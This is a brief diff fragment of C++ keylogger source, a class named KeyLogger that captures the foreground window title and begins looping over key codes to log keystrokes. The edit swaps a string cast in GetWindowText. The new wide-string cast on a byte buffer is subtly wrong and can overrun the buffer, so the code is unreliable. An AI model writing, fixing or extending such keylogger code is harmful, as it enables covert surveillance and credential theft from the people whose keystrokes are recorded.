@@ -17,7 +17,7 @@ void KeyLogger::log() {
     // get the active windowtitle
     char title[1024];
     HWND hwndHandle = GetForegroundWindow();
-    GetWindowText(hwndHandle, (LPSTR)title, 1023);
+    GetWindowText(hwndHandle, (LPWSTR)title, 1023);
 
     // logging keys, thats the keylogger
     for(unsigned char c = 1; c < 255; c++) {
